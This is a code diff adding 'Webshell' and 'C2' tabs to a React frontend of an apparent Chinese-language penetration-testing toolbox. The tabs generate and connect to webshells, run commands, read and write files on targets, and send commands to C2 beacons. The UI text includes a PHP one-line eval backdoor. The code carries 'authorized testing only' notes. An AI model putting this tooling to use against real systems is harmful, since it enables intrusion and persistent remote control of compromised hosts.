@@ -9,7 +9,7 @@ import { Input } from "@/components/ui/input";
 import { api, type RepHistoryItem, type ScanJob } from "@/lib/api";
 import {
   CameraIcon, HammerIcon, PlayIcon, SquareIcon, WandIcon, StarIcon, TrashIcon,
-  RadarIcon, FolderSearchIcon, ChefHatIcon,
+  RadarIcon, FolderSearchIcon, ChefHatIcon, TerminalIcon, ShieldIcon,
 } from "lucide-react";
 
 interface Hop {
@@ -87,7 +87,7 @@ function hlResponse(text: string): string {
 const defaultRaw =
   "GET / HTTP/1.1\nHost: example.com\nUser-Agent: FORANG-Repeater\nAccept: */*\nConnection: close";
 
-type Tab = "repeater" | "cyberchef" | "portscan" | "dirscan";
+type Tab = "repeater" | "cyberchef" | "portscan" | "dirscan" | "webshell" | "c2";
 
 export default function ToolboxPage() {
   const [tab, setTab] = React.useState<Tab>("repeater");
@@ -96,6 +96,8 @@ export default function ToolboxPage() {
     { key: "cyberchef", label: "综合解码", icon: <ChefHatIcon className="size-4" /> },
     { key: "portscan", label: "端口扫描", icon: <RadarIcon className="size-4" /> },
     { key: "dirscan", label: "目录扫描", icon: <FolderSearchIcon className="size-4" /> },
+    { key: "webshell", label: "Webshell", icon: <ShieldIcon className="size-4" /> },
+    { key: "c2", label: "C2 指挥", icon: <TerminalIcon className="size-4" /> },
   ];
   return (
     <div className="space-y-4 p-4">
@@ -120,6 +122,8 @@ export default function ToolboxPage() {
       {tab === "cyberchef" && <CyberChefTab />}
       {tab === "portscan" && <PortScanTab />}
       {tab === "dirscan" && <DirScanTab />}
+      {tab === "webshell" && <WebshellTab />}
+      {tab === "c2" && <C2Tab />}
     </div>
   );
 }
@@ -927,6 +931,330 @@ function DirScanTab() {
           </CardContent>
         </Card>
       </div>
+    </div>
+  );
+}
+
+// ==================== Webshell ====================
+
+const WS_SCRIPT_TYPES = ["php", "jsp", "jspx", "asp", "aspx", "py", "node"];
+const WS_ENCODERS = [
+  { key: "raw", label: "raw（蚁剑 base64）" },
+  { key: "aes", label: "aes（冰蝎 3.0）" },
+  { key: "xor", label: "xor（哥斯拉）" },
+];
+
+function WebshellTab() {
+  // 生成区
+  const [gsType, setGsType] = React.useState("php");
+  const [gsEnc, setGsEnc] = React.useState("raw");
+  const [gsPwd, setGsPwd] = React.useState("");
+  const [gen, setGen] = React.useState<{ path: string; code: string; size: number } | null>(null);
+  const [genBusy, setGenBusy] = React.useState(false);
+  const [copied, setCopied] = React.useState(false);
+  // 连接区
+  const [url, setUrl] = React.useState("");
+  const [pwd, setPwd] = React.useState("");
+  const [enc, setEnc] = React.useState("raw");
+  const [st, setSt] = React.useState("php");
+  const [op, setOp] = React.useState("exec");
+  const [cmd, setCmd] = React.useState("whoami");
+  const [path, setPath] = React.useState("");
+  const [content, setContent] = React.useState("");
+  const [out, setOut] = React.useState("");
+  const [busy, setBusy] = React.useState(false);
+
+  const generate = async () => {
+    if (!gsPwd.trim()) return void window.alert("密码必填");
+    setGenBusy(true);
+    try {
+      const r = await api.webshellGenerate({ script_type: gsType, encoder: gsEnc, password: gsPwd });
+      setGen(r.data);
+    } catch (e) {
+      window.alert("生成失败: " + (e instanceof Error ? e.message : String(e)));
+    } finally {
+      setGenBusy(false);
+    }
+  };
+
+  const run = async (opv?: string) => {
+    if (!url.trim() || !pwd.trim()) return void window.alert("URL 与密码必填");
+    setBusy(true);
+    setOut("");
+    try {
+      const r = await api.webshellExec({
+        url, password: pwd, encoder: enc, script_type: st,
+        op: opv || op, cmd, path, content,
+      });
+      const d = r.data;
+      setOut(d.ok ? `[成功] ${d.output}${d.cwd ? "\n[cwd] " + d.cwd : ""}` : `[失败] ${d.error}`);
+    } catch (e) {
+      setOut("[错误] " + (e instanceof Error ? e.message : String(e)));
+    } finally {
+      setBusy(false);
+    }
+  };
+
+  return (
+    <div className="grid gap-3 lg:grid-cols-2">
+      <Card>
+        <CardHeader className="py-2"><CardTitle className="text-sm">生成 Webshell</CardTitle></CardHeader>
+        <CardContent className="space-y-2 p-3 text-sm">
+          <div className="grid grid-cols-3 gap-2">
+            <select className="rounded border bg-transparent p-1.5 text-sm" value={gsType} onChange={(e) => setGsType(e.target.value)}>
+              {WS_SCRIPT_TYPES.map((t) => <option key={t} value={t}>{t}</option>)}
+            </select>
+            <select className="rounded border bg-transparent p-1.5 text-sm" value={gsEnc} onChange={(e) => setGsEnc(e.target.value)}>
+              {WS_ENCODERS.map((t) => <option key={t.key} value={t.key}>{t.label}</option>)}
+            </select>
+            <Input placeholder="连接密码" value={gsPwd} onChange={(e) => setGsPwd(e.target.value)} />
+          </div>
+          <div className="text-xs text-muted-foreground">
+            php/jsp/jspx/py/node 支持 raw/aes/xor；asp/aspx 仅 raw。form-cmd 编码器不生成文件（配合一句话 `&lt;?php eval($_POST[&apos;cmd&apos;]); ?&gt;`，连接时编码器选 raw 亦可直连）。
+          </div>
+          <Button size="sm" onClick={generate} disabled={genBusy}>
+            <PlayIcon className="mr-1 size-4" /> {genBusy ? "生成中…" : "生成"}
+          </Button>
+          {gen && (
+            <div className="space-y-1">
+              <div className="flex items-center justify-between text-xs text-muted-foreground">
+                <span>已存 {gen.path}（{gen.size} 字节）—— 部署到目标后用右侧连接</span>
+                <Button
+                  variant="outline" size="sm"
+                  onClick={async () => {
+                    await navigator.clipboard.writeText(gen.code);
+                    setCopied(true);
+                    setTimeout(() => setCopied(false), 1500);
+                  }}
+                >
+                  {copied ? "已复制 ✓" : "复制代码"}
+                </Button>
+              </div>
+              <pre className="max-h-72 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-[11px] leading-relaxed">{gen.code}</pre>
+            </div>
+          )}
+        </CardContent>
+      </Card>
+
+      <Card>
+        <CardHeader className="py-2"><CardTitle className="text-sm">连接 / 执行</CardTitle></CardHeader>
+        <CardContent className="space-y-2 p-3 text-sm">
+          <div className="grid grid-cols-2 gap-2">
+            <Input placeholder="shell URL（http://target/shell.php）" value={url} onChange={(e) => setUrl(e.target.value)} />
+            <Input placeholder="密码" value={pwd} onChange={(e) => setPwd(e.target.value)} />
+          </div>
+          <div className="grid grid-cols-3 gap-2">
+            <select className="rounded border bg-transparent p-1.5 text-sm" value={enc} onChange={(e) => setEnc(e.target.value)}>
+              {WS_ENCODERS.map((t) => <option key={t.key} value={t.key}>{t.key}</option>)}
+            </select>
+            <select className="rounded border bg-transparent p-1.5 text-sm" value={st} onChange={(e) => setSt(e.target.value)}>
+              {WS_SCRIPT_TYPES.map((t) => <option key={t} value={t}>{t}</option>)}
+            </select>
+            <select className="rounded border bg-transparent p-1.5 text-sm" value={op} onChange={(e) => setOp(e.target.value)}>
+              <option value="exec">exec 执行命令</option>
+              <option value="test">test 连通性</option>
+              <option value="list">list 列目录</option>
+              <option value="read">read 读文件</option>
+              <option value="write">write 写文件</option>
+            </select>
+          </div>
+          {op === "exec" && <Input placeholder="命令" value={cmd} onChange={(e) => setCmd(e.target.value)} />}
+          {(op === "list" || op === "read" || op === "write") && <Input placeholder="目标路径（/var/www）" value={path} onChange={(e) => setPath(e.target.value)} />}
+          {op === "write" && <textarea className="h-20 w-full rounded border bg-transparent p-2 font-mono text-xs" placeholder="写入内容（文本）" value={content} onChange={(e) => setContent(e.target.value)} />}
+          <div className="flex items-center gap-2">
+            <Button size="sm" onClick={() => run()} disabled={busy}>
+              <PlayIcon className="mr-1 size-4" /> {busy ? "执行中…" : "执行"}
+            </Button>
+            <Button variant="outline" size="sm" onClick={() => run("test")} disabled={busy}>先测连通</Button>
+            <span className="text-xs text-muted-foreground">仅用于授权渗透测试。</span>
+          </div>
+          {out && (
+            <pre className="max-h-72 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-[11px] leading-relaxed">{out}</pre>
+          )}
+        </CardContent>
+      </Card>
+    </div>
+  );
+}
+
+// ==================== C2 指挥 ====================
+
+function C2Tab() {
+  const [status, setStatus] = React.useState<{ url: string; token_masked: string; reachable: boolean; beacons: number; error: string } | null>(null);
+  const [clients, setClients] = React.useState<Record<string, unknown>[]>([]);
+  const [listeners, setListeners] = React.useState<Record<string, unknown>[]>([]);
+  const [sel, setSel] = React.useState<string>("");
+  const [cmd, setCmd] = React.useState("id; hostname");
+  const [out, setOut] = React.useState("");
+  const [busy, setBusy] = React.useState(false);
+  const [cfgOpen, setCfgOpen] = React.useState(false);
+  const [cfgUrl, setCfgUrl] = React.useState("");
+  const [cfgToken, setCfgToken] = React.useState("");
+  const pollRef = React.useRef<ReturnType<typeof setInterval> | null>(null);
+
+  const load = React.useCallback(async () => {
+    try {
+      const st = await api.c2Status();
+      setStatus(st.data);
+      if (st.data.reachable) {
+        const [c, l] = await Promise.all([api.c2Clients(), api.c2Listeners()]);
+        setClients(c.data || []);
+        setListeners(l.data || []);
+      } else {
+        setClients([]);
+        setListeners([]);
+      }
+    } catch {
+      /* ignore */
+    }
+  }, []);
+
+  React.useEffect(() => {
+    load();
+    return () => {
+      if (pollRef.current) clearInterval(pollRef.current);
+    };
+  }, [load]);
+
+  const exec = async () => {
+    if (!sel || !cmd.trim()) return void window.alert("先选 beacon，输入命令");
+    setBusy(true);
+    setOut("");
+    try {
+      const r = await api.c2Exec(sel, cmd);
+      const tid = r.data?.task_id;
+      if (!tid) throw new Error("服务端未返回 taskId");
+      if (pollRef.current) clearInterval(pollRef.current);
+      pollRef.current = setInterval(async () => {
+        try {
+          const t = await api.c2Tasks(sel, tid);
+          const arr = t.data || [];
+          for (const it of arr) {
+            const m = it as Record<string, unknown>;
+            if ((m.taskId as string) !== tid && (m.taskId as string) !== "") continue;
+            const stt = String(m.status || "");
+            const o = String(m.output || m.result || "");
+            if (o || stt === "completed" || stt === "done") {
+              if (pollRef.current) clearInterval(pollRef.current);
+              setOut(`[任务 ${tid}] ${stt}\n${o}`);
+              setBusy(false);
+              load();
+              return;
+            }
+          }
+        } catch {
+          if (pollRef.current) clearInterval(pollRef.current);
+          setBusy(false);
+        }
+      }, 2000);
+      // 40s 超时兜底
+      setTimeout(() => {
+        if (pollRef.current) {
+          clearInterval(pollRef.current);
+          setBusy(false);
+          setOut((o) => o || `[任务 ${tid}] 40s 内未取到结果（beacon 可能休眠），稍后刷新看任务列表。`);
+        }
+      }, 40000);
+    } catch (e) {
+      setOut("[错误] " + (e instanceof Error ? e.message : String(e)));
+      setBusy(false);
+    }
+  };
+
+  const saveCfg = async () => {
+    try {
+      const r = await api.c2SettingsSet({ url: cfgUrl || undefined, token: cfgToken || undefined });
+      window.alert(r.ok ? "已保存并探活成功" : "已保存，但探活失败: " + r.status);
+      setCfgOpen(false);
+      load();
+    } catch (e) {
+      window.alert("保存失败: " + (e instanceof Error ? e.message : String(e)));
+    }
+  };
+
+  const g = (m: Record<string, unknown>, k: string) => String(m[k] ?? "");
+
+  return (
+    <div className="space-y-3">
+      <Card>
+        <CardContent className="flex flex-wrap items-center gap-3 py-3 text-sm">
+          {status && (
+            <>
+              <span className={`rounded px-2 py-0.5 ${status.reachable ? "bg-green-500/15 text-green-600" : "bg-red-500/15 text-red-500"}`}>
+                {status.reachable ? "goc2 在线" : "不可达"}
+              </span>
+              <span className="font-mono text-xs text-muted-foreground">{status.url} · token {status.token_masked}</span>
+              <span className="text-xs text-muted-foreground">beacon {status.beacons} / 监听器 {listeners.length}</span>
+              {!status.reachable && status.error && <span className="text-xs text-red-400">{status.error}</span>}
+            </>
+          )}
+          <div className="ml-auto flex gap-2">
+            <Button variant="outline" size="sm" onClick={() => setCfgOpen(!cfgOpen)}>goc2 配置</Button>
+            <Button variant="outline" size="sm" onClick={load}>刷新</Button>
+          </div>
+        </CardContent>
+        {cfgOpen && (
+          <CardContent className="space-y-2 border-t p-3 text-sm">
+            <div className="grid grid-cols-2 gap-2">
+              <Input placeholder="goc2 admin URL（http://172.25.0.1:18400）" value={cfgUrl} onChange={(e) => setCfgUrl(e.target.value)} />
+              <Input placeholder="admin token（留空=不修改）" value={cfgToken} onChange={(e) => setCfgToken(e.target.value)} />
+            </div>
+            <Button size="sm" onClick={saveCfg}>保存并探活</Button>
+            <div className="text-xs text-muted-foreground">token 只存服务端 settings，不下发前端。</div>
+          </CardContent>
+        )}
+      </Card>
+
+      <div className="grid gap-3 lg:grid-cols-5">
+        <Card className="lg:col-span-2">
+          <CardHeader className="py-2"><CardTitle className="text-sm">Beacon 会话（{clients.length}）</CardTitle></CardHeader>
+          <CardContent className="max-h-[420px] space-y-1 overflow-auto p-2 text-xs">
+            {clients.length === 0 && <div className="py-6 text-center text-muted-foreground">无会话</div>}
+            {clients.map((c) => (
+              <div
+                key={g(c, "id")}
+                className={`cursor-pointer rounded border p-1.5 font-mono hover:bg-muted/60 ${sel === g(c, "id") ? "border-primary bg-muted" : ""}`}
+                onClick={() => setSel(g(c, "id"))}
+              >
+                <div className="flex items-center justify-between">
+                  <span className="font-semibold text-blue-400">{g(c, "hostname")}</span>
+                  <span className="text-[10px] text-muted-foreground">{g(c, "osType")} / {g(c, "arch")}</span>
+                </div>
+                <div className="flex items-center justify-between text-muted-foreground">
+                  <span>{g(c, "internalIp")}</span>
+                  <span>{String(c.lastBeacon || "").slice(5, 16)}</span>
+                </div>
+                <div className="truncate text-[10px] text-muted-foreground">{g(c, "id")}</div>
+              </div>
+            ))}
+          </CardContent>
+        </Card>
+
+        <Card className="lg:col-span-3">
+          <CardHeader className="py-2"><CardTitle className="text-sm">命令下发{sel ? ` → ${sel.slice(0, 18)}…` : ""}</CardTitle></CardHeader>
+          <CardContent className="space-y-2 p-3 text-sm">
+            <div className="flex gap-2">
+              <Input value={cmd} onChange={(e) => setCmd(e.target.value)} placeholder="id; hostname" disabled={!sel || busy} />
+              <Button size="sm" onClick={exec} disabled={!sel || busy}>
+                <PlayIcon className="mr-1 size-4" /> {busy ? "等待回连…" : "下发"}
+              </Button>
+            </div>
+            <div className="text-xs text-muted-foreground">任务下发后轮询结果（beacon 心跳间隔影响回显延迟）。仅用于授权测试。</div>
+            {out && <pre className="max-h-64 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-[11px]">{out}</pre>}
+          </CardContent>
+        </Card>
+      </div>
+
+      {listeners.length > 0 && (
+        <Card>
+          <CardHeader className="py-2"><CardTitle className="text-sm">监听器（{listeners.length}）</CardTitle></CardHeader>
+          <CardContent className="p-2">
+            <pre className="max-h-40 overflow-auto whitespace-pre-wrap font-mono text-[11px] text-muted-foreground">
+              {JSON.stringify(listeners, null, 2)}
+            </pre>
+          </CardContent>
+        </Card>
+      )}
     </div>
   );
 }
